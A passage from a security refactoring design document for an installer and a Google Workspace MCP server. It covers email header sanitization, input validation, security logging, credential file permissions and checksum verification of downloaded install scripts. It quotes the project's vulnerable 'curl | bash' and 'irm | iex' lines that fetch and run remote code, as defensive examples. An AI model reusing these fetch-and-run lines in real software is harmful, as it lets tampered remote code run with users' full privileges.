Add sanitization functions to `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/utils/sanitize.ts`:

```typescript
/**
 * Sanitize a value for use in an RFC 2822 email header.
 *
 * Strips CR (\r) and LF (\n) characters to prevent header injection.
 * These are the only characters that can introduce new headers in
 * the RFC 2822 format.
 */
export function sanitizeEmailHeader(value: string): string {
  return value.replace(/[\r\n]/g, "");
}

/**
 * Validate an email address format.
 *
 * This is a basic structural check, not a full RFC 5322 validation.
 * The Gmail API performs additional validation when sending.
 * The purpose here is to reject obviously malformed inputs that
 * could indicate injection attempts.
 */
export function validateEmailAddress(email: string): void {
  // Support comma-separated multiple recipients
  const addresses = email.split(",").map((a) => a.trim());
  for (const addr of addresses) {
    // Extract the email part (handle "Name <email>" format)
    const match = addr.match(/<([^>]+)>/) || [null, addr];
    const emailPart = (match[1] || addr).trim();
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailPart)) {
      throw new Error(`Invalid email address format: ${sanitizeEmailHeader(addr)}`);
    }
  }
}
```

Apply in `gmail_send` handler (file: `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/tools/gmail.ts`, replacing lines 110-121):

```typescript
import { sanitizeEmailHeader, validateEmailAddress } from "../utils/sanitize.js";

// ... inside gmail_send handler:
handler: async ({ to, subject, body, cc, bcc }: { to: string; subject: string; body: string; cc?: string; bcc?: string }) => {
  const { gmail } = await getGoogleServices();

  // Sanitize all header values to prevent CRLF injection
  const safeTo = sanitizeEmailHeader(to);
  const safeCc = cc ? sanitizeEmailHeader(cc) : undefined;
  const safeBcc = bcc ? sanitizeEmailHeader(bcc) : undefined;

  // Validate email format
  validateEmailAddress(safeTo);
  if (safeCc) validateEmailAddress(safeCc);
  if (safeBcc) validateEmailAddress(safeBcc);

  const messageParts = [
    `To: ${safeTo}`,
    safeCc ? `Cc: ${safeCc}` : "",
    safeBcc ? `Bcc: ${safeBcc}` : "",
    `Subject: =?UTF-8?B?${Buffer.from(subject).toString("base64")}?=`,
    "Content-Type: text/plain; charset=utf-8",
    "",
    body,
  ].filter(Boolean).join("\n");

  // ... rest unchanged
```

Apply the same pattern in `gmail_draft_create` handler (lines 152-162):

```typescript
// ... inside gmail_draft_create handler:
handler: async ({ to, subject, body, cc }: { to: string; subject: string; body: string; cc?: string }) => {
  const { gmail } = await getGoogleServices();

  const safeTo = sanitizeEmailHeader(to);
  const safeCc = cc ? sanitizeEmailHeader(cc) : undefined;

  validateEmailAddress(safeTo);
  if (safeCc) validateEmailAddress(safeCc);

  const messageParts = [
    `To: ${safeTo}`,
    safeCc ? `Cc: ${safeCc}` : "",
    `Subject: =?UTF-8?B?${Buffer.from(subject).toString("base64")}?=`,
    "Content-Type: text/plain; charset=utf-8",
    "",
    body,
  ].filter(Boolean).join("\n");

  // ... rest unchanged
```

### 3. Security Invariant

**Property:** All email header values (To, Cc, Bcc) are stripped of `\r` and `\n` characters before being placed into RFC 2822 header lines. After sanitization, it is impossible for a header value to span multiple lines or introduce additional headers. Email addresses are additionally validated against a basic format pattern before use.

**OWASP A03 Guarantee:** Email header injection is prevented. The sanitization function ensures that no user-supplied value can introduce new headers into the raw MIME message.

---

## FR-S1-11: Remote Script Download Integrity Verification

**Verification Report Reference:** SEC-01
**OWASP Mapping:** A08 -- Software and Data Integrity Failures
**Severity:** Critical
**Effort:** 6-8 hours

> **Gap analysis reference:** This section was added per gap analysis report (gap-security-verification.md) D-01 recommendation. SEC-01 was designated as priority 1 (Critical) in the verification report, and was completely missing from the existing design document v1.0.

### 1. Current Vulnerability

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/installer/install.sh`

**install.sh lines 350-351 (module installation path):**

```bash
else
    curl -sSL "$BASE_URL/modules/$module_name/install.sh" | bash
```

**install.sh lines 101-117 (remote module metadata loading):**

```bash
local modules_json=$(curl -sSL "$BASE_URL/modules.json" 2>/dev/null || echo "")
# ...
local json=$(curl -sSL "$BASE_URL/modules/$name/module.json" 2>/dev/null || echo "")
```

**install.ps1 line 336 (Windows module installation path):**

```powershell
irm "$BaseUrl/modules/$ModuleName/install.ps1" | iex
```

**Problem:** Remote scripts are executed immediately after download without integrity verification. If an attacker injects malicious code through MITM attacks, DNS poisoning, or GitHub repository compromise, arbitrary code executes with the user's full privileges. curl's `-sSL` flags suppress errors, making tampering detection even more difficult.

**Affected code paths (4 total):**

| # | File | Line | Pattern | Description |
|---|------|------|------|------|
| 1 | `installer/install.sh` | 350-351 | `curl -sSL ... \| bash` | Per-module installation script execution |
| 2 | `installer/install.sh` | 101 | `curl -sSL ... modules.json` | Module list metadata download |
| 3 | `installer/install.sh` | 106 | `curl -sSL ... module.json` | Individual module metadata download |
| 4 | `installer/install.ps1` | 336 | `irm ... \| iex` | Windows module installation script execution |

### 2. Refactored Design

#### 2.1 checksums.json Manifest Structure

Publish `checksums.json` as a release artifact in the GitHub repository. This file contains SHA-256 hashes of all files subject to remote download.

```json
{
  "version": "1.0",
  "algorithm": "sha256",
  "generated": "2026-02-12T00:00:00Z",
  "files": {
    "modules.json": "a1b2c3d4e5f6...(64 hex chars)",
    "modules/google/module.json": "f6e5d4c3b2a1...",
    "modules/google/install.sh": "1a2b3c4d5e6f...",
    "modules/google/install.ps1": "6f5e4d3c2b1a...",
    "modules/atlassian/module.json": "...",
    "modules/atlassian/install.sh": "...",
    "modules/atlassian/install.ps1": "...",
    "modules/figma/module.json": "...",
    "modules/figma/install.sh": "...",
    "modules/figma/install.ps1": "..."
  }
}
```

**Generation method:** Automatically generated during release in CI/CD pipeline (GitHub Actions):

```bash
# checksums.json auto-generation script (for CI/CD)
generate_checksums() {
    local base_dir="$1"
    local output="$base_dir/checksums.json"

    echo '{"version":"1.0","algorithm":"sha256","generated":"'$(date -u +%Y-%m-%dT%H:%M:%SZ)'","files":{' > "$output"

    local first=true
    for file in modules.json modules/*/module.json modules/*/install.sh modules/*/install.ps1; do
        if [ -f "$base_dir/$file" ]; then
            local hash=$(shasum -a 256 "$base_dir/$file" | awk '{print $1}')
            if [ "$first" = true ]; then
                first=false
            else
                echo ',' >> "$output"
            fi
            echo "\"$file\":\"$hash\"" >> "$output"
        fi
    done

    echo '}}' >> "$output"
}
```

#### 2.2 download_and_verify() Function (Bash/macOS/Linux)

Integrity verification function to add to `install.sh`:

```bash
# checksums.json cache (download only once per session)
CHECKSUMS_JSON=""

# Download and cache checksums.json
load_checksums() {
    if [ -z "$CHECKSUMS_JSON" ]; then
        CHECKSUMS_JSON=$(curl -sSL "$BASE_URL/checksums.json" 2>/dev/null || echo "")
        if [ -z "$CHECKSUMS_JSON" ]; then
            echo -e "${RED}[ERROR] Failed to download checksums.json. Aborting installation.${NC}"
            exit 1
        fi
    fi
}

# Remote file download + SHA-256 integrity verification
download_and_verify() {
    local url="$1"
    local relative_path="$2"  # key in checksums.json (e.g., "modules/google/install.sh")
    local tmpfile=$(mktemp)

    # 1. Extract expected hash from checksums.json
    load_checksums
    local expected_hash=$(echo "$CHECKSUMS_JSON" | node -e "
        let data = '';
        process.stdin.setEncoding('utf8');
        process.stdin.on('data', chunk => data += chunk);
        process.stdin.on('end', () => {
            try {
                const checksums = JSON.parse(data);
                const hash = checksums.files[process.argv[1]] || '';
                process.stdout.write(hash);
            } catch (e) {
                process.stdout.write('');
            }
        });
    " "$relative_path" 2>/dev/null)

    if [ -z "$expected_hash" ]; then
        echo -e "${RED}[ERROR] Checksum not found for '$relative_path'.${NC}"
        rm -f "$tmpfile"
        return 1
    fi

    # 2. Download file to temporary path
    curl -sSL "$url" -o "$tmpfile"
    if [ $? -ne 0 ]; then
        echo -e "${RED}[ERROR] Download failed: $url${NC}"
        rm -f "$tmpfile"
        return 1
    fi

    # 3. Calculate and compare SHA-256 hash
    local actual_hash=$(shasum -a 256 "$tmpfile" | awk '{print $1}')

    if [ "$actual_hash" != "$expected_hash" ]; then
        echo -e "${RED}[SECURITY] Integrity verification failed!${NC}"
        echo -e "${RED}  File: $relative_path${NC}"
        echo -e "${RED}  Expected hash: $expected_hash${NC}"
        echo -e "${RED}  Actual hash: $actual_hash${NC}"
        echo -e "${RED}  File may have been tampered with. Aborting installation.${NC}"
        rm -f "$tmpfile"
        return 1
    fi

    echo -e "  ${GREEN}Integrity verified: $relative_path${NC}"

    # 4. Return temporary file path after verification pass
    echo "$tmpfile"
    return 0
}
```

#### 2.3 Replacing Existing curl|bash Patterns

**install.sh lines 350-351 replacement (module installation scripts):**

```bash
# Before (vulnerable):
# curl -sSL "$BASE_URL/modules/$module_name/install.sh" | bash

# After (safe):
local verified_script
verified_script=$(download_and_verify \
    "$BASE_URL/modules/$module_name/install.sh" \
    "modules/$module_name/install.sh")

if [ $? -eq 0 ] && [ -f "$verified_script" ]; then
    source "$verified_script"
    rm -f "$verified_script"
else
    echo -e "${RED}[ERROR] Module $module_name installation script verification failed. Skipping.${NC}"
fi
```

**install.sh lines 101, 106 replacement (metadata download):**

```bash
# modules.json download and verification
local modules_tmpfile
modules_tmpfile=$(download_and_verify "$BASE_URL/modules.json" "modules.json")
if [ $? -ne 0 ]; then
    echo -e "${RED}[ERROR] modules.json verification failed${NC}"
    return 1
fi
local modules_json=$(cat "$modules_tmpfile")
rm -f "$modules_tmpfile"

# Individual module.json download and verification
local module_tmpfile
module_tmpfile=$(download_and_verify \
    "$BASE_URL/modules/$name/module.json" \
    "modules/$name/module.json")
if [ $? -ne 0 ]; then
    echo -e "${YELLOW}[WARN] $name/module.json verification failed. Skipping.${NC}"
    continue
fi
local json=$(cat "$module_tmpfile")
rm -f "$module_tmpfile"
```

#### 2.4 Download-And-Verify (PowerShell/Windows)

Windows counterpart function to add to `install.ps1`:

```powershell
# checksums.json cache
$script:ChecksumsData = $null

function Get-Checksums {
    if ($null -eq $script:ChecksumsData) {
        try {
            $raw = (Invoke-RestMethod "$BaseUrl/checksums.json" -ErrorAction Stop)
            $script:ChecksumsData = $raw
        } catch {
            Write-Host "[ERROR] Failed to download checksums.json. Aborting installation." -ForegroundColor Red
            exit 1
        }
    }
    return $script:ChecksumsData
}

function Invoke-DownloadAndVerify {
    param(
        [string]$Url,
        [string]$RelativePath
    )

    # 1. Extract expected hash
    $checksums = Get-Checksums
    $expectedHash = $checksums.files.$RelativePath
    if ([string]::IsNullOrEmpty($expectedHash)) {
        Write-Host "[ERROR] Checksum not found for '$RelativePath'." -ForegroundColor Red
        return $null
    }

    # 2. Download to temporary file
    $tmpFile = [System.IO.Path]::GetTempFileName()
    try {
        Invoke-WebRequest -Uri $Url -OutFile $tmpFile -ErrorAction Stop
    } catch {
        Write-Host "[ERROR] Download failed: $Url" -ForegroundColor Red
        Remove-Item $tmpFile -Force -ErrorAction SilentlyContinue
        return $null
    }

    # 3. Calculate and compare SHA-256 hash
    $actualHash = (Get-FileHash -Path $tmpFile -Algorithm SHA256).Hash.ToLower()

    if ($actualHash -ne $expectedHash) {
        Write-Host "[SECURITY] Integrity verification failed!" -ForegroundColor Red
        Write-Host "  File: $RelativePath" -ForegroundColor Red
        Write-Host "  Expected hash: $expectedHash" -ForegroundColor Red
        Write-Host "  Actual hash: $actualHash" -ForegroundColor Red
        Write-Host "  File may have been tampered with. Aborting installation." -ForegroundColor Red
        Remove-Item $tmpFile -Force -ErrorAction SilentlyContinue
        return $null
    }

    Write-Host "  Integrity verified: $RelativePath" -ForegroundColor Green
    return $tmpFile
}
```

**install.ps1 line 336 replacement:**

```powershell
# Before (vulnerable):
# irm "$BaseUrl/modules/$ModuleName/install.ps1" | iex

# After (safe):
$verifiedScript = Invoke-DownloadAndVerify `
    -Url "$BaseUrl/modules/$ModuleName/install.ps1" `
    -RelativePath "modules/$ModuleName/install.ps1"

if ($null -ne $verifiedScript) {
    . $verifiedScript
    Remove-Item $verifiedScript -Force -ErrorAction SilentlyContinue
} else {
    Write-Host "[ERROR] Module $ModuleName installation script verification failed. Skipping." -ForegroundColor Red
}
```

#### 2.5 GPG Signatures (Out of Scope)

GPG signature-based verification was classified as Out of Scope in the plan and is not included in this design. SHA-256 checksum verification alone can mitigate the following threats:

- **MITM attacks:** Since both checksums.json and actual files must be tampered with simultaneously, attack difficulty increases significantly.
- **CDN/cache tampering:** Immediately aborts on hash mismatch, preventing execution of tampered code.
- **Partial downloads:** Incomplete files are also detected by hash mismatch.

**Limitation:** Can be bypassed if checksums.json itself is tampered with. This relies on HTTPS transport security, and full mitigation requires GPG signatures (to be reviewed in future Sprints).

### 3. Security Invariant

**Property:** All remotely downloaded files (scripts, JSON metadata) have their integrity verified via SHA-256 checksum before execution or parsing. On checksum mismatch, the file is immediately deleted and installation is aborted. The `curl|bash` or `irm|iex` pattern is completely eliminated from the entire project and replaced with the mandatory 3-step pattern: "download -> verify -> execute".

**OWASP A08 Guarantee:** Integrity of software and data downloaded from remote sources is verified before execution, preventing Software and Data Integrity Failures.

---

## Input Validation Layer

**OWASP Mapping:** A03 (Injection), A04 (Insecure Design)
**Scope:** All MCP tool handlers across gmail.ts, drive.ts, calendar.ts, docs.ts, sheets.ts, slides.ts

### Current State

The MCP server in `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/index.ts` registers tools at lines 27-56 with Zod schemas for type validation, but there is no centralized input sanitization layer. Each tool handler receives raw input from the LLM/user and passes it directly to Google APIs. The tool registration loop at line 32 passes params with type `any`:

```typescript
server.tool(
  name,
  tool.description,
  tool.schema,
  async (params: any) => {
```

### Design

Create a centralized validation and sanitization middleware layer.

**New file: `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/utils/sanitize.ts`**

This file consolidates all sanitization functions (already partially shown above):

```typescript
/**
 * Centralized input sanitization utilities for the Google Workspace MCP server.
 *
 * Every function in this module is a pure function: it takes a string and
 * returns a sanitized string (or throws for invalid input). No side effects.
 *
 * These functions are the ONLY approved way to sanitize user input before
 * passing it to external APIs. Direct string interpolation of user input
 * into API queries, headers, or commands is prohibited.
 */

// ---- Google Drive Query Language ----

/**
 * Escape a value for the Google Drive API query language.
 * Prevents breakout from single-quoted string context.
 */
export function escapeDriveQuery(input: string): string {
  return input.replace(/\\/g, "\\\\").replace(/'/g, "\\'");
}

/**
 * Valid pattern for Google Drive file/folder IDs.
 */
export const DRIVE_ID_PATTERN = /^[a-zA-Z0-9_-]+$/;

/**
 * Validate a Google Drive file or folder ID.
 * Throws on invalid format.
 */
export function validateDriveId(id: string, fieldName: string): void {
  if (id !== "root" && !DRIVE_ID_PATTERN.test(id)) {
    throw new Error(
      `Invalid ${fieldName} format. Expected alphanumeric characters, hyphens, and underscores.`
    );
  }
}

// ---- Email Headers (RFC 2822) ----

/**
 * Strip CR/LF from email header values to prevent header injection.
 */
export function sanitizeEmailHeader(value: string): string {
  return value.replace(/[\r\n]/g, "");
}

/**
 * Validate email address format (supports "Name <email>" and comma-separated lists).
 * Throws on invalid format.
 */
export function validateEmailAddress(email: string): void {
  const addresses = email.split(",").map((a) => a.trim());
  for (const addr of addresses) {
    const match = addr.match(/<([^>]+)>/) || [null, addr];
    const emailPart = (match[1] || addr).trim();
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailPart)) {
      throw new Error(`Invalid email address format: ${sanitizeEmailHeader(addr)}`);
    }
  }
}

// ---- Generic String Validation ----

/**
 * Validate that a string does not exceed a maximum length.
 * Prevents resource exhaustion from extremely large inputs.
 */
export function validateMaxLength(value: string, maxLength: number, fieldName: string): void {
  if (value.length > maxLength) {
    throw new Error(
      `${fieldName} exceeds maximum length of ${maxLength} characters.`
    );
  }
}

/**
 * Validate that a number is within an acceptable range.
 */
export function validateRange(value: number, min: number, max: number, fieldName: string): void {
  if (value < min || value > max) {
    throw new Error(
      `${fieldName} must be between ${min} and ${max}. Got: ${value}`
    );
  }
}
```

**Modified tool registration in `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/index.ts`:**

Add centralized error handling that strips internal details:

```typescript
// Tool registration with sanitized error handling
for (const [name, tool] of Object.entries(allTools)) {
  server.tool(
    name,
    tool.description,
    tool.schema,
    async (params: any) => {
      try {
        const result = await tool.handler(params);
        return {
          content: [
            {
              type: "text" as const,
              text: JSON.stringify(result, null, 2),
            },
          ],
        };
      } catch (error: any) {
        // Log full error server-side for debugging
        console.error(`[${name}] Error:`, error.message);

        // Return sanitized error to client (no stack traces, no internal paths)
        const safeMessage = error.message
          .replace(/\/[^\s:]+/g, "[path]")  // strip file paths
          .slice(0, 500);                    // limit length

        return {
          content: [
            {
              type: "text" as const,
              text: `Error: ${safeMessage}`,
            },
          ],
          isError: true,
        };
      }
    }
  );
}
```

### Validation Coverage Matrix

> **Gap analysis reflected (D-02):** Extended the matrix that previously only covered Drive/Gmail to include Calendar, Docs, Sheets, and Slides.

#### Drive Tools

| Tool | Input Field | Validation Applied |
|------|------------|-------------------|
| `drive_search` | `query` | `escapeDriveQuery()` |
| `drive_search` | `mimeType` | `escapeDriveQuery()` |
| `drive_search` | `maxResults` | `validateRange(1, 100)` |
| `drive_list` | `folderId` | `validateDriveId()` + `escapeDriveQuery()` |
| `drive_list` | `maxResults` | `validateRange(1, 100)` |
| `drive_get_file` | `fileId` | `validateDriveId()` |
| `drive_create_folder` | `name` | `validateMaxLength(500)` |
| `drive_copy` | `fileId` | `validateDriveId()` |
| `drive_move` | `fileId`, `newParentId` | `validateDriveId()` |
| `drive_rename` | `fileId` | `validateDriveId()` |
| `drive_rename` | `newName` | `validateMaxLength(500)` |
| `drive_delete` | `fileId` | `validateDriveId()` |
| `drive_restore` | `fileId` | `validateDriveId()` |
| `drive_share` | `fileId` | `validateDriveId()` |
| `drive_share` | `email` | `sanitizeEmailHeader()` + `validateEmailAddress()` |
| `drive_unshare` | `email` | `sanitizeEmailHeader()` + `validateEmailAddress()` |

#### Gmail Tools

| Tool | Input Field | Validation Applied |
|------|------------|-------------------|
| `gmail_send` | `to`, `cc`, `bcc` | `sanitizeEmailHeader()` + `validateEmailAddress()` |
| `gmail_send` | `subject` | Already base64-encoded (safe) |
| `gmail_draft_create` | `to`, `cc` | `sanitizeEmailHeader()` + `validateEmailAddress()` |

#### Calendar Tools

| Tool | Input Field | Validation Applied |
|------|------------|-------------------|
| `calendar_list_events` | `calendarId` | `sanitizeEmailHeader()` (calendarId is email format) |
| `calendar_list_events` | `timeMin`, `timeMax` | `validateISO8601DateTime()` |
| `calendar_list_events` | `maxResults` | `validateRange(1, 250)` |
| `calendar_get_event` | `calendarId` | `sanitizeEmailHeader()` |
| `calendar_get_event` | `eventId` | `validateMaxLength(1024)` + `validateNoNewlines()` |
| `calendar_create_event` | `calendarId` | `sanitizeEmailHeader()` |
| `calendar_create_event` | `start`, `end` | `validateISO8601DateTime()` + `validateDateRange()` |
| `calendar_create_event` | `summary` | `validateMaxLength(1000)` |
| `calendar_create_event` | `attendees` | `validateEmailAddress()` (each attendee) |
| `calendar_create_all_day_event` | `startDate`, `endDate` | `validateDateFormat()` (YYYY-MM-DD) |
| `calendar_update_event` | `eventId` | `validateMaxLength(1024)` + `validateNoNewlines()` |
| `calendar_delete_event` | `eventId` | `validateMaxLength(1024)` + `validateNoNewlines()` |
| `calendar_find_free_time` | `timeMin`, `timeMax` | `validateISO8601DateTime()` |

#### Docs Tools

| Tool | Input Field | Validation Applied |
|------|------------|-------------------|
| `docs_create` | `title` | `validateMaxLength(500)` |
| `docs_read` | `documentId` | `validateDriveId()` |
| `docs_append` | `documentId` | `validateDriveId()` |
| `docs_append` | `text` | `validateMaxLength(100000)` |
| `docs_prepend` | `documentId` | `validateDriveId()` |
| `docs_replace_text` | `documentId` | `validateDriveId()` |
| `docs_replace_text` | `findText` | `validateMaxLength(5000)` |
| `docs_insert_heading` | `documentId` | `validateDriveId()` |
| `docs_insert_heading` | `level` | `validateRange(1, 6)` |
| `docs_add_comment` | `documentId` | `validateDriveId()` |

#### Sheets Tools

| Tool | Input Field | Validation Applied |
|------|------------|-------------------|
| `sheets_create` | `title` | `validateMaxLength(500)` |
| `sheets_read` | `spreadsheetId` | `validateDriveId()` |
| `sheets_read` | `range` | `validateA1Notation()` |
| `sheets_read_multiple` | `spreadsheetId` | `validateDriveId()` |
| `sheets_read_multiple` | `ranges` | `validateA1Notation()` (each range) |
| `sheets_write` | `spreadsheetId` | `validateDriveId()` |
| `sheets_write` | `range` | `validateA1Notation()` |
| `sheets_append` | `spreadsheetId` | `validateDriveId()` |
| `sheets_append` | `range` | `validateA1Notation()` |
| `sheets_clear` | `spreadsheetId` | `validateDriveId()` |
| `sheets_clear` | `range` | `validateA1Notation()` |
| `sheets_add_sheet` | `spreadsheetId` | `validateDriveId()` |
| `sheets_add_sheet` | `title` | `validateMaxLength(200)` |
| `sheets_rename_sheet` | `spreadsheetId` | `validateDriveId()` |
| `sheets_format_cells` | `range` | `validateA1Notation()` |

#### Slides Tools

| Tool | Input Field | Validation Applied |
|------|------------|-------------------|
| `slides_create` | `title` | `validateMaxLength(500)` |
| `slides_get_info` | `presentationId` | `validateDriveId()` |
| `slides_read` | `presentationId` | `validateDriveId()` |
| `slides_add_slide` | `presentationId` | `validateDriveId()` |
| `slides_delete_slide` | `presentationId` | `validateDriveId()` |
| `slides_delete_slide` | `slideId` | `validateMaxLength(200)` + `validateNoNewlines()` |
| `slides_add_text` | `presentationId` | `validateDriveId()` |
| `slides_add_text` | `text` | `validateMaxLength(50000)` |
| `slides_replace_text` | `presentationId` | `validateDriveId()` |

### Additional Validation Functions (sanitize.ts Extension)

Validation functions to add to `sanitize.ts` to support Calendar, Sheets, and other tools:

```typescript
// ---- Calendar Date/Time Validation ----

/**
 * ISO 8601 date/time format validation.
 * Google Calendar API requires RFC 3339 format.
 * e.g., "2026-02-12T09:00:00+09:00", "2026-02-12T00:00:00Z"
 */
export function validateISO8601DateTime(value: string, fieldName: string): void {
  const parsed = new Date(value);
  if (isNaN(parsed.getTime())) {
    throw new Error(
      `${fieldName} is not a valid ISO 8601 date/time format: ${value}`
    );
  }
}

/**
 * Date range validation: verify that start is before end.
 */
export function validateDateRange(start: string, end: string): void {
  const startDate = new Date(start);
  const endDate = new Date(end);
  if (startDate >= endDate) {
    throw new Error("Start time is after or equal to end time.");
  }
}

/**
 * Date format validation (YYYY-MM-DD).
 * Used for all-day events.
 */
export function validateDateFormat(value: string, fieldName: string): void {
  if (!/^\d{4}-\d{2}-\d{2}$/.test(value)) {
    throw new Error(
      `${fieldName} is not in YYYY-MM-DD format: ${value}`
    );
  }
  const parsed = new Date(value + "T00:00:00Z");
  if (isNaN(parsed.getTime())) {
    throw new Error(`${fieldName} is not a valid date: ${value}`);
  }
}

// ---- Sheets A1 Notation Validation ----

/**
 * Google Sheets A1 notation range string validation.
 * Valid examples: "Sheet1!A1:B10", "A1:B10", "Sheet1!A:B", "A1"
 * Injection prevention: A1 notation has no query language, but
 * blocks abnormally long strings and control characters.
 */
export function validateA1Notation(range: string, fieldName: string = "range"): void {
  // Maximum length limit
  if (range.length > 200) {
    throw new Error(`${fieldName} exceeds 200 character limit.`);
  }
  // Block control characters (tabs, newlines, etc.)
  if (/[\x00-\x1f]/.test(range)) {
    throw new Error(`${fieldName} contains disallowed control characters.`);
  }
  // Basic A1 notation pattern validation
  // Allows sheetName!cellRange or cellRange format
  const a1Pattern = /^([^!]+!)?[A-Za-z]{0,3}\d{0,7}(:[A-Za-z]{0,3}\d{0,7})?$/;
  if (!a1Pattern.test(range)) {
    throw new Error(
      `${fieldName} is not a valid A1 notation format: ${range}`
    );
  }
}

// ---- Generic String Validation ----

/**
 * Validate that a string contains no newline characters.
 * Used for single-line values such as API keys, event IDs.
 */
export function validateNoNewlines(value: string, fieldName: string): void {
  if (/[\r\n]/.test(value)) {
    throw new Error(`${fieldName} contains newline characters.`);
  }
}
```

---

## Security Event Logging

**OWASP Mapping:** A09 -- Security Logging and Monitoring Failures
**Scope:** oauth.ts, index.ts, installer scripts

> **Gap analysis reflected:** Addresses Cross-Cutting Concern #3 "No Security Logging" from the verification report. This is a design to resolve the absence of security logging identified as OWASP A09 (Security Logging and Monitoring Failures).

### Current State

There is no structured logging for security-related events:
- Authentication attempt success/failure is not recorded
- OAuth token refresh events are not tracked
- File permission changes (chmod) are not logged
- MCP server error handling outputs unstructured messages via `console.error()`

### Design

Since the MCP server uses stdout for JSON-RPC protocol communication, all security logs are output to **stderr**. Structured JSON format is used to enable machine parsing.

#### Security Log Format

```typescript
/**
 * Security event log output.
 * Outputs in JSON format to stderr to avoid conflict with MCP protocol.
 */
interface SecurityLogEntry {
  timestamp: string;       // ISO 8601
  level: "INFO" | "WARN" | "ERROR";
  event_type: string;      // Event type identifier
  result: "success" | "failure";
  detail: string;          // Human-readable description
  metadata?: Record<string, string>;  // Additional context (excluding sensitive info)
}

function logSecurityEvent(entry: SecurityLogEntry): void {
  const logLine = JSON.stringify({
    ...entry,
    timestamp: new Date().toISOString(),
  });
  process.stderr.write(`[SECURITY] ${logLine}\n`);
}
```

#### Events Subject to Logging

| Event Type | level | Location | Logged Content |
|------------|:-----:|----------|----------|
| `auth.oauth.start` | INFO | `oauth.ts` (getTokenFromBrowser start) | OAuth auth flow started, port number |
| `auth.oauth.success` | INFO | `oauth.ts` (after token received) | OAuth auth success (token values themselves are not logged) |
| `auth.oauth.failure` | ERROR | `oauth.ts` (state mismatch, timeout) | Failure reason: state_mismatch, timeout, no_code |
| `auth.oauth.csrf_rejected` | WARN | `oauth.ts` (state validation failure) | CSRF attempt detected, only first 8 chars of received state value logged |
| `auth.token.refresh` | INFO | `oauth.ts` (token refresh) | Token refresh success/failure |
| `auth.token.save` | INFO | `oauth.ts` (saveToken) | Token file saved, permissions set |
| `fs.permission.set` | INFO | `oauth.ts` (ensureConfigDir, saveToken) | File/directory permission setting, path, mode |
| `fs.permission.heal` | WARN | `oauth.ts` (when correcting existing permissions) | Loose permissions on existing file corrected, previous mode/new mode |
| `validation.rejected` | WARN | `sanitize.ts` (on validation failure) | Input validation failure, tool name, field name, reason (input values not logged) |
| `tool.error` | ERROR | `index.ts` (error handler) | Tool execution error, tool name, error type (stack traces excluded) |

#### Application Examples

**oauth.ts -- Authentication event logging:**

```typescript
async function getTokenFromBrowser(oauth2Client: OAuth2Client): Promise<TokenData> {
  const state = crypto.randomBytes(32).toString("hex");

  logSecurityEvent({
    timestamp: "",
    level: "INFO",
    event_type: "auth.oauth.start",
    result: "success",
    detail: `OAuth auth flow started (port: ${OAUTH_PORT})`,
  });

  // ... (existing code)

  // On state mismatch:
  if (receivedState !== state) {
    logSecurityEvent({
      timestamp: "",
      level: "WARN",
      event_type: "auth.oauth.csrf_rejected",
      result: "failure",
      detail: "OAuth state parameter mismatch - possible CSRF attempt",
      metadata: { received_state_prefix: (receivedState || "").slice(0, 8) },
    });
    // ... existing 403 response code
  }

  // On success:
  logSecurityEvent({
    timestamp: "",
    level: "INFO",
    event_type: "auth.oauth.success",
    result: "success",
    detail: "OAuth auth success, token received",
  });
}
```

**oauth.ts -- File permission logging:**

```typescript
function ensureConfigDir(): void {
  if (!fs.existsSync(CONFIG_DIR)) {
    fs.mkdirSync(CONFIG_DIR, { recursive: true, mode: 0o700 });
    logSecurityEvent({
      timestamp: "",
      level: "INFO",
      event_type: "fs.permission.set",
      result: "success",
      detail: `Config directory created (mode: 0700)`,
      metadata: { path: CONFIG_DIR, mode: "0700" },
    });
  }

  try {
    const stats = fs.statSync(CONFIG_DIR);
    const currentMode = stats.mode & 0o777;
    if (currentMode !== 0o700) {
      fs.chmodSync(CONFIG_DIR, 0o700);
      logSecurityEvent({
        timestamp: "",
        level: "WARN",
        event_type: "fs.permission.heal",
        result: "success",
        detail: `Config directory permissions corrected`,
        metadata: {
          path: CONFIG_DIR,
          previous_mode: currentMode.toString(8).padStart(4, "0"),
          new_mode: "0700",
        },
      });
    }
  } catch {
    // chmod may fail on Windows
  }
}
```

#### Security Logging Rules

1. **Exclude sensitive information:** Token values, passwords, and API keys must never be included in logs.
2. **Exclude user input:** Input values themselves are not logged on validation failure (log injection prevention).
3. **stderr only:** Since MCP's JSON-RPC protocol uses stdout, all security logs are output to stderr.
4. **Structured format:** All logs are output in JSON format to ensure compatibility with automated analysis tools.
5. **Minimum fields:** All log entries must include `timestamp`, `event_type`, `result`, `detail`.

---

## Secure Credential Storage Architecture

**OWASP Mapping:** A02 (Cryptographic Failures), A05 (Security Misconfiguration)

### Current State

| Credential | Storage Location | Current Permissions | Exposure |
|-----------|-----------------|--------------------|----|
| Google OAuth tokens | `~/.google-workspace/token.json` | 0644 (default) | World-readable |
| Google client secret | `~/.google-workspace/client_secret.json` | 0644 (default) | World-readable |
| Atlassian API token | `~/.mcp.json` (inline in Docker args) | 0644 (default) | World-readable, visible in `ps` |
| MCP config | `~/.mcp.json` | 0644 (default) | World-readable |

### Target Architecture

```
$HOME/
  .mcp.json                            (0600) -- MCP server configs, NO credentials
  .google-workspace/                   (0700) -- Google credentials directory
    client_secret.json                 (0600) -- OAuth client ID/secret
    token.json                         (0600) -- OAuth access/refresh tokens
  .atlassian-mcp/                      (0700) -- Atlassian credentials directory
    credentials.env                    (0600) -- API tokens in Docker env-file format
```

### Permission Enforcement Points

**1. Application-level (oauth.ts) -- Runtime enforcement:**

```typescript
// ensureConfigDir() -- called on every auth operation
function ensureConfigDir(): void {
  if (!fs.existsSync(CONFIG_DIR)) {
    fs.mkdirSync(CONFIG_DIR, { recursive: true, mode: 0o700 });
  }
  // Heal permissions if weakened
  try {
    fs.chmodSync(CONFIG_DIR, 0o700);
  } catch {}
}

// saveToken() -- called on every token save
function saveToken(token: TokenData): void {
  ensureConfigDir();
  fs.writeFileSync(TOKEN_PATH, JSON.stringify(token, null, 2), { mode: 0o600 });
  try {
